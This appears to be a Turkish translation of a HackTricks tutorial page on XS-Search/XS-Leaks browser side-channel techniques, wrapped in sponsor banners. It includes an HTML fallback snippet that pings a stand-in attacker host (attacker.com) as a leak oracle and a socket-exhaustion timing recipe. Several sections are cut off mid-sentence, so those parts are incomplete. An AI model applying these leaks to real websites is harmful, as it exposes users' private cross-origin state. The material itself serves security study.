# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturabilir ve otomatikleştirebilirsiniz.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'ler**](https://opensea.io/collection/the-peass-family)
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* Hacking hilelerinizi göndererek HackTricks ve HackTricks Cloud github reposuna PR göndererek **hacking hilelerinizi paylaşın**.

</details>

## Temel Bilgiler

XS-Search, **yan kanal zafiyetlerini** kullanarak **çapraz kaynak bilgilerini** çıkarmak için kullanılan bir yöntemdir.

Bu saldırıda yer alan temel bileşenler şunlardır:

* **Zayıf Web**: Bilgilerin çıkarılması amaçlanan hedef web sitesi.
* **Saldırganın Web'i**: Saldırgan tarafından oluşturulan kötü niyetli web sitesi, kurbanın ziyaret ettiği ve saldırıyı barındıran.
* **Dahil Etme Yöntemi**: Zayıf Web'i Saldırganın Web'ine dahil etmek için kullanılan teknik (örneğin, window.open, iframe, fetch, href ile HTML etiketi vb.).
* **Sızıntı Tekniği**: Dahil etme yöntemi aracılığıyla toplanan bilgilere dayanarak Zayıf Web'in durumu arasındaki farkları ayırt etmek için kullanılan teknikler.
* **Durumlar**: Saldırganın ayırt etmeyi amaçladığı Zayıf Web'in iki potansiyel durumu.
* **Ayırt Edilebilir Farklar**: Saldırganın Zayıf Web'in durumunu çıkarım yapmak için güvendiği gözlemlenebilir farklılıklar.

### Ayırt Edilebilir Farklar

Zayıf Web'in durumlarını ayırt etmek için birkaç yön incelenebilir:

* **Durum Kodu**: Çapraz kaynakta **çeşitli HTTP yanıt durum kodları** arasındaki farkı ayırt etmek, sunucu hataları, istemci hataları veya kimlik doğrulama hataları gibi.
* **API Kullanımı**: Sayfalar arasında **Web API'lerinin kullanımını** belirlemek, çapraz kaynak sayfasının belirli bir JavaScript Web API'sini kullanıp kullanmadığını ortaya çıkarır.
* **Yönlendirmeler**: Yalnızca HTTP yönlendirmeleri değil, JavaScript veya HTML tarafından tetiklenen farklı sayfalara yapılan gezinmeleri tespit etmek.
* **Sayfa İçeriği**: HTTP yanıt gövdesindeki veya sayfa alt kaynaklarında (gömülü çerçevelerin sayısı veya görüntülerdeki boyut farklılıkları gibi) değişikliklerin gözlemlenmesi.
* **HTTP Başlığı**: Belirli bir HTTP yanıt başlığının varlığını veya olası değerini (X-Frame-Options, Content-Disposition ve Cross-Origin-Resource-Policy gibi başlıklar) belirlemek.
* **Zamanlama**: İki durum arasındaki tutarlı zaman farklarını fark etmek.

### Dahil Etme Yöntemleri

* **HTML Öğeleri**: HTML, stil sayfaları, görüntüler veya betikler gibi **çapraz kaynak kaynağı dahil etme** için çeşitli öğeler sunar, tarayıcının bir HTML olmayan kaynağı istemesini sağlar. Bu amaçla potansiyel HTML öğelerinin bir derlemesi [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks) adresinde bulunabilir.
* **Çerçeveler**: **iframe**, **object** ve **embed** gibi öğeler, HTML kaynaklarını doğrudan saldırganın sayfasına yerleştirir. Sayfa **çerçeve koruması eksikse**, JavaScript, çerçevelenmiş kaynağın pencere nesnesine contentWindow özelliği aracılığıyla erişebilir.
* **Açılır Pencereler**: **`window.open`** yöntemi, JavaScript'in SOP'yi takip eden yöntemler ve özelliklerle etkileşimde bulunabilmesi için bir kaynağı yeni bir sekmede veya pencerede açar. Açılır pencereler, genellikle tek oturum açma işleminde kullanılır ve hedef kaynağın çerçeveleme ve çerez kısıtlamalarını atlar. Bununla birlikte, modern tarayıcılar açılır pencere oluşturmayı belirli kullanıcı eylemlerine sınırlar.
* **JavaScript İstekleri**: JavaScript, **XMLHttpRequests** veya **Fetch API** kullanarak hedef kaynaklara doğrudan istekler yapabilir. Bu yöntemler, HTTP yönlendirmelerini takip etme gibi isteğe tam kontrol sağlar.

### Sızıntı Teknikleri

* **Olay İşleyici**: XS-Leaks'te klasik bir sızıntı tekniği olan olay işleyicileri (**onload** ve **onerror** gibi), kaynak yükleme başarısı veya başarısızlığı hakkında bilgi sağlar.
* **Hata Mesajları**: JavaScript istisnaları veya özel hata sayfaları, hata mesajının kendisinden veya varlığı ve yokluğu arasındaki farktan kaynak sızıntısı bilgisi sağlayabilir.
* **Genel Sınırlar**: Tarayıcının bellek kapasitesi veya diğer zorunlu tarayıcı sınırlamaları gibi tarayıcının fiziksel sınırlamaları, bir eşik noktasına ulaşıldığında sızıntı tekniği olarak hizmet edebilir.
* **Genel Durum**: Tarayıcıların **genel durumlarıyla** (örneğin, Geçmiş arabirimi) tespit edilebilir etkileşimler sömürülebilir. Örneğin, bir tarayıcının geçmişindeki girişlerin sayısı, çapraz kaynak sayfaları hakkında ipuçları sunabilir.
* **Performans API'si**: Bu API, mevcut sayfanın performans ayrıntılarını, belge ve yüklenen kaynaklar için ağ zamanlamasını içeren performans ayrıntıları sağlar, istenen kaynaklar hakkında çıkarımlar yapmayı sağlar.
* **Okunabilir Öznitelikler**: Bazı HTML öznitelikleri **çapraz kaynakta okunabilir** ve sızıntı tekniği olarak kullanılabilir. Örneğin, `window.frame.length` özelliği, bir web sayfasında yer alan çerçeveleri saymak için JavaScript'in kullanılmasına olanak tanır.

## XSinator Aracı ve Makale

XSinator, **birkaç bilinen XS-Leaks'e karşı tarayıcıları kontrol etmek için otomatik bir araçtır** ve makalesiyle açıklanmıştır: **[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)**

Araça [https://xsinator.com/](https://xsinator.com/) adresinden **erişebilirsiniz**

{% hint style="warning" %}
**Dışlanan XS-Leaks**: XSinator'da diğer sızınt
## **Zamanlama Tabanlı Teknikler**

Aşağıdaki tekniklerin bazıları, web sayfalarının olası durumlarındaki farklılıkları tespit etmek için süreyi kullanacak. Bir web tarayıcısında zamanı ölçmenin farklı yolları vardır.

**Saatler**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API, geliştiricilere yüksek çözünürlüklü zaman ölçümleri almayı sağlar.\
Saldırganların zımni saatler oluşturmak için istismar edebileceği önemli sayıda API bulunmaktadır: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animasyonları ve diğerleri.\
Daha fazla bilgi için: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Olay İşleyici Teknikleri

### Onload/Onerror

* **Dahil Etme Yöntemleri**: Frames, HTML Elementleri
* **Tespit Edilebilir Fark**: Durum Kodu
* **Daha fazla bilgi**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Özet**: Bir kaynağı yüklemeye çalışırken onerror/onload olayları, kaynak başarıyla/başarısız bir şekilde yüklendiğinde durum kodunu belirlemek mümkündür.
* **Örnek kod**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Örnek kod, **JS'den script nesneleri yüklemeyi** deniyor, ancak nesneler, stil sayfaları, resimler, sesler gibi **diğer etiketler** de kullanılabilir. Dahası, etiketi doğrudan enjekte etmek ve etiketin içinde `onload` ve `onerror` olaylarını bildirmek de mümkündür (JS'den enjekte etmek yerine).

Bu saldırının ayrıca script olmayan bir versiyonu da vardır:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Bu durumda, `example.com/404` bulunamazsa `attacker.com/?error` yüklenecektir.

### Onload Zamanlama

* **Dahil Etme Yöntemleri**: HTML Öğeleri
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Özet:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API**, bir isteğin gerçekleştirilmesi için ne kadar süre gerektiğini ölçmek için kullanılabilir. Bununla birlikte, [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) gibi diğer saatler de kullanılabilir, bu saatler 50 ms'den daha uzun süren görevleri tanımlayabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) başka bir örnek:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Zamanlama + Zorunlu Ağır Görev

Bu teknik, öncekiyle aynıdır, ancak **saldırgan**, **cevap olumlu veya olumsuz olduğunda** biraz zaman alacak bir **ilgili eylem** de **zorlar** ve bu süreyi ölçer.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Zamanlama

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Özet:** [SharedArrayBuffer saat](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) bir isteğin gerçekleştirilmesi için ne kadar süre gerektiğini ölçmek için kullanılabilir. Diğer saatler de kullanılabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Bir kaynağın alınması için geçen süre, [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) ve [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) olaylarını kullanarak ölçülebilir. **`beforeunload`** olayı, tarayıcının yeni bir sayfaya yönlendirmek üzere olduğu zaman tetiklenirken, **`unload`** olayı navigasyon gerçekleştiğinde meydana gelir. Bu iki olay arasındaki zaman farkı, tarayıcının kaynağı almak için harcadığı süreyi belirlemek için hesaplanabilir.

### Sandboxed Frame Zamanlama + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Özet:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API, bir isteğin gerçekleştirilmesi için ne kadar süre gerektiğini ölçmek için kullanılabilir. Diğer saatler de kullanılabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

[Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/) olmadığında, bir sayfanın ve alt kaynaklarının ağ üzerinden yüklenmesi için gereken süre bir saldırgan tarafından ölçülebilir. Bu ölçüm genellikle bir iframe'in `onload` işleyicisi, kaynak yükleme ve JavaScript yürütmesinin tamamlanmasından sonra tetiklenir. Betik yürütme tarafından tanıtılan değişkenliği atlatmak için, bir saldırgan `<iframe>` içinde [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) özniteliğini kullanabilir. Bu özniteliğin eklenmesi, JavaScript'in yürütülmesi de dahil olmak üzere birçok işlevin kısıtlanmasını sağlar ve bu da ölçümün çoğunlukla ağ performansından etkilenen bir ölçüm yapılmasını kolaylaştırır.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + hata + onload

* **Ekleme Yöntemleri**: Frames
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha fazla bilgi**:
* **Özet**: Doğru içeriğe erişildiğinde sayfada hata oluşturabilir ve herhangi bir içerik erişildiğinde doğru şekilde yüklenmesini sağlayabilirseniz, zamanı ölçmeden tüm bilgileri çıkarmak için bir döngü oluşturabilirsiniz.
* **Örnek Kod**:

Varsayalım ki **gizli** içeriğe sahip olan **sayfayı Iframe içine ekleyebilirsiniz**.

Kurbanın "_**flag**_" içeren bir dosyayı aramasını sağlayabilirsiniz, örneğin bir CSRF'yi kullanarak bir **Iframe** içinde (exploit). Iframe içinde, _**onload etkinliği**_ her zaman en az bir kez **yürütülecektir**. Ardından, URL'nin içindeki **hash**'in sadece **içeriğini değiştirerek** Iframe'ın **URL**'sini **değiştirebilirsiniz**.

Örneğin:

1. **URL1**: www.saldırgan.com/xssearch#try1
2. **URL2**: www.saldırgan.com/xssearch#try2

İlk URL **başarıyla yüklendi** ise, URL'nin **hash** kısmını değiştirdiğinizde **onload** etkinliği **tekrar tetiklenmeyecektir**. Ancak sayfa yüklenirken bir tür **hata** oluştuysa, **onload** etkinliği **tekrar tetiklenecektir**.

Bu şekilde, **doğru** yüklenen bir sayfa ile erişilen bir **hata** içeren sayfa arasında ayrım yapabilirsiniz.

### Javascript Yürütme

* **Ekleme Yöntemleri**: Frames
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha fazla bilgi**:
* **Özet**: Sayfa, **duyarlı** içeriği **geri döndürüyorsa** veya kullanıcı tarafından **kontrol edilebilen** bir **içerik** döndürüyorsa, kullanıcı **negatif durumda geçerli JS kodunu** ayarlayabilir ve her denemeyi **`<script>`** etiketleri içinde yükleyebilir, böylece **negatif** durumlarda saldırganların **kodu yürütülür**, **olumlu** durumlarda ise **hiçbir şey** yürütülmez.
* **Örnek Kod**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Ekleme Yöntemleri**: HTML Öğeleri
* **Algılanabilir Fark**: Durum Kodu ve Başlıklar
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Özet**: **Cross-Origin Read Blocking (CORB)**, **Spectre** gibi saldırılara karşı koruma sağlamak için web sayfalarının belirli hassas cross-origin kaynakları yüklemesini engelleyen bir güvenlik önlemidir. Bununla birlikte, saldırganlar koruyucu davranışını istismar edebilir. **CORB**'a tabi bir yanıt, `Content-Type`'da **CORB korumalı** bir değerle `nosniff` ve `2xx` durum kodu döndürdüğünde, **CORB**, yanıtın gövdesini ve başlıklarını kaldırır. Bunu gözlemleyen saldırganlar, **durum kodu** (başarı veya hata gösteren) ve `Content-Type`'ın (CORB tarafından korunup korunmadığını belirten) kombinasyonunu çıkarabilir ve potansiyel bilgi sızıntısına yol açabilir.
* **Örnek Kod**:

Saldırı hakkında daha fazla bilgi için daha fazla bilgi bağlantısına bakın.

### onblur

* **Ekleme Yöntemleri**: Frames
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Özet**: ID veya name özniteliğinden hassas veri sızdırma.
* **Örnek Kod**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Bir sayfayı bir **iframe** içine yüklemek ve sayfanın **`#id_değeri`** ile iframe'ın öğesine odaklanmasını sağlamak mümkündür, ardından **`onblur`** sinyali tetiklendiğinde ID öğesi var demektir.\
Aynı saldırıyı **`portal`** etiketleriyle gerçekleştirebilirsiniz.

### postMessage Yayınları <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Ekleme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: API Kullanımı
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Özet**: postMessage'dan hassas bilgileri toplamak veya postMessage'ın varlığını bir oracle olarak kullanarak kullanıcının sayfadaki durumunu bilmek.
* **Örnek Kod**: `Tüm postMessage'ları dinleyen herhangi bir kod.`

Uygulamalar genellikle farklı kökenler arasında iletişim kurmak için [`postMessage` yayınlarını](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) kullanır. Ancak, hedef köken parametresi doğru şekilde belirtilmezse, bu yöntem yanlışlıkla **hassas bilgileri** ortaya çıkarabilir ve herhangi bir pencerenin mesajları almasına izin verebilir. Ayrıca, bir mesaj almanın tek başına bir **oracle** olarak işlev görebilir; örneğin, belirli mesajlar yalnızca oturum açmış kullanıcılara gönderilebilir. Bu nedenle, bu mesajların varlığı veya yokluğu, kullanıcının durumu veya kimliği hakkında bilgi verebilir, örneğin kimlik doğrulamasının yapıldığı veya yapılmadığı gibi.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





En gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturmanıza ve otomatikleştirmenize olanak sağlayan [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}



## Global Sınırlar Teknikleri

### WebSocket API

* **Ekleme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: API Kullanımı
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Özet**: WebSocket bağlantı sınırını tüketmek, çapraz kökenli bir sayfanın WebSocket bağlantılarının sayısını sızdırır.
* **Örnek Kod**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Hedef sayfanın kaç tane WebSocket bağlantısı kullandığını ve nasıl kullandığını belirlemek mümkündür. Bu, saldırganın uygulama durumlarını tespit etmesine ve WebSocket bağlantı sayısıyla ilişkili bilgileri sızdırmasına olanak tanır.

Bir **köken**, bağlantıların durumlarına bakılmaksızın, **maksimum miktarda WebSocket** bağlantı nesnesini kullandığında, yeni nesnelerin oluşturulması **JavaScript istisn
### Ödeme API'si

* **Dahil Etme Yöntemleri**: Frames, Pop-up'lar
* **Algılanabilir Fark**: API Kullanımı
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Özet**: Sadece bir tane etkin ödeme isteği olabileceğinden ödeme isteğini algılayın.
* **Kod Örneği**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Bu XS-Leak, bir saldırganın **çapraz kaynaklı bir sayfanın bir ödeme isteği başlattığını tespit etmesine** olanak tanır.

Çünkü **aynı anda yalnızca bir ödeme isteği etkin olabilir**, hedef web sitesi Ödeme İsteği API'sini kullanıyorsa, bu API'yi kullanmaya yönelik herhangi bir **daha sonraki girişim başarısız olacak** ve bir **JavaScript istisnasına** neden olacaktır. Saldırgan, Ödeme API'sinin kullanılıp kullanılmadığını **periyodik olarak Ödeme API'si UI'sini göstermeye çalışarak** sömürebilir. Bir deneme istisna oluşturursa, hedef web sitesi şu anda bunu kullanıyor demektir. Saldırgan, bu periyodik denemeleri hemen oluşturduktan sonra UI'yi kapatıp gizleyebilir.

### Olay Döngüsünün Zamanlaması <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Dahil Etme Yöntemleri**:
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Özet**: Tek iş parçacıklı JS olay döngüsünü kötüye kullanarak bir webin yürütme süresini ölçün.
* **Kod Örneği**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript, [tek iş parçacıklı bir olay döngüsü](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) eşzamanlılık modeli üzerinde çalışır, bu da **aynı anda yalnızca bir görevi yürütebileceği** anlamına gelir. Bu özellik, **farklı bir kökenden gelen kodun yürütülmesinin ne kadar sürdüğünü ölçmek** için sömürülebilir. Bir saldırgan, sürekli olarak sabit özelliklere sahip olayları göndererek kendi kodunun olay döngüsündeki yürütme süresini ölçebilir. Bu olaylar, olay havuzu boş olduğunda işlenecektir. Diğer kökenler de aynı havuza olay gönderiyorsa, bir saldırgan, kendi görevlerinin yürütülmesindeki gecikmeleri gözlemleyerek bu harici olayların yürütülme süresini çıkarabilir. Gecikmeleri izlemek için olay döngüsünü denetlemek, farklı kökenlerden gelen kodun yürütme süresini ortaya çıkarabilir ve hassas bilgilerin ortaya çıkmasına neden olabilir.

{% hint style="warning" %}
Bir yürütme zamanlamasında, **daha kesin ölçümler** elde etmek için **ağ faktörlerini ortadan kaldırmak** mümkündür. Örneğin, sayfanın yüklenmeden önce kullanılan kaynakları yükleyerek.
{% endhint %}

### Meşgul Olay Döngüsü <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Dahil Etme Yöntemleri**:
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Özet**: Bir web işleminin yürütme süresini ölçmenin bir yolu, bir iş parçacığın olay döngüsünü kasıtlı olarak engellemek ve ardından olay döngüsünün tekrar kullanılabilir hale gelmesi için geçen süreyi zamanlamaktır. Bir iş parçacığına (uzun bir hesaplama veya senkron API çağrısı gibi) bir engelleme işlemi ekleyerek ve sonraki kodun yürütme süresini izleyerek, engelleme süresi boyunca olay döngüsünde yürütülen görevlerin süresini çıkarabilirsiniz. Bu teknik, JavaScript'in tek iş parçacıklı olay döngüsünün, görevlerin sırayla yürütüldüğü, diğer işlemlerin aynı iş parçacığını paylaşan diğer işlemlerin performansı veya davranışı hakkında bilgi sağlayabilir.

* **Kod Örneği**:

Olay döngüsünü kilitleyerek yürütme süresini ölçme tekniğinin önemli bir avantajı, **Site İzolasyonu**'nu atlatma potansiyeline sahip olmasıdır. **Site İzolasyonu**, farklı web sitelerini ayrı işlemlere ayıran bir güvenlik özelliğidir ve kötü niyetli sitelerin diğer sitelerin hassas verilerine doğrudan erişmesini engellemeyi amaçlar. Bununla birlikte, paylaşılan olay döngüsü aracılığıyla başka bir kökenin yürütme zamanlamasını etkileyerek, bir saldırgan o kökenin faaliyetleri hakkında bilgi çıkarabilir. Bu yöntem, diğer kökenin verilerine doğrudan erişime dayanmaz, ancak o kökenin faaliyetlerinin paylaşılan olay döngüsü üzerindeki etkisini gözlemler ve böylece **Site İzolasyonu** tarafından oluşturulan koruyucu engelleri atlatır.

{% hint style="warning" %}
Bir yürütme zamanlamasında, **daha kesin ölçümler** elde etmek için **ağ faktörlerini ortadan kaldırmak** mümkündür. Örneğin, sayfanın yüklenmeden önce kullanılan kaynakları yükleyerek.
{% endhint %}

### Bağlantı Havuzu

* **Dahil Etme Yöntemleri**: JavaScript İstekleri
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Özet**: Bir saldırgan, tüm soketleri 1 hariç kilitler, hedef webi yükler ve aynı anda başka bir sayfayı yükler, son sayfanın yüklenmeye başlaması için geçen süre, hedef sayfanın yüklenme süresidir.
* **Kod Örneği**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Tarayıcılar sunucu iletişimi için soketleri kullanır, ancak işletim sistemi ve donanımın sınırlı kaynakları nedeniyle, tarayıcılar eşzamanlı soketler üzerinde bir sınırlama uygulamak zorunda kalır. Saldırganlar bu sınırlamayı aşağıdaki adımlarla sömürebilir:

1. Tarayıcının soket sınırını belirleyin, örneğin 256 global soket.
2. 255 soketi uzun bir süre boyunca işgal ederek, bağlantıları tamamlamadan açık tutacak şekilde çeşitli ana bilgisayarlara 255 istek başlatın.
3. 256. soketi hedef sayfaya bir istek göndermek için kullanın.
4. Farklı bir ana bilgisayara 257. bir istek yapmaya çalışın. 2. ve 3. adımlara göre tüm soketler kullanımda olduğundan,
## Performans API Teknikleri

[`Performans API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance), web uygulamalarının performans metriklerine dair bilgiler sunar ve [`Kaynak Zamanlama API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API) tarafından daha da zenginleştirilir. Kaynak Zamanlama API, isteklerin süreleri gibi ayrıntılı ağ istek zamanlamalarının izlenmesini sağlar. Özellikle sunucular, yanıtlarında `Timing-Allow-Origin: *` başlığını içeriyorsa, transfer boyutu ve alan arama süresi gibi ek veriler kullanılabilir hale gelir.

Bu zengin veri, [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) veya [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) gibi yöntemler aracılığıyla alınabilir ve performansla ilgili bilgilerin kapsamlı bir görünümünü sağlar. Ayrıca, API, [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) ile elde edilen zaman damgaları arasındaki farkı hesaplayarak yürütme sürelerinin ölçülmesini kolaylaştırır. Ancak, Chrome gibi bazı tarayıcılarda, `performance.now()`'un hassasiyeti milisaniyelerle sınırlı olabilir, bu da zamanlama ölçümlerinin ayrıntısını etkileyebilir.

Zamanlama ölçümlerinin ötesinde, Performans API'si güvenlikle ilgili bilgiler için de kullanılabilir. Örneğin, Chrome'da `performance` nesnesindeki sayfaların varlığı veya yokluğu, `X-Frame-Options`'ın uygulanmasını gösterebilir. Özellikle, bir sayfa `X-Frame-Options` nedeniyle bir çerçevede görüntülenmesi engellenirse, `performance` nesnesinde kaydedilmeyeceğinden sayfanın çerçeveleme politikaları hakkında ipucu sağlar.

### Hata Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler, HTML Öğeleri
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Hatalara yol açan bir istek, bir kaynak zamanlama girişi oluşturmaz.
* **Örnek Kod**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Hatalara yol açan bir istek, bir performans girişi oluşturmaz, bu nedenle HTTP yanıt durum kodları arasında **farklılık yapmak mümkündür**.

### Stil Yeniden Yükleme Hatası

* **Dahil Etme Yöntemleri**: HTML Öğeleri
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Tarayıcı hatası nedeniyle hatalara yol açan istekler iki kez yüklenir.
* **Örnek Kod**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

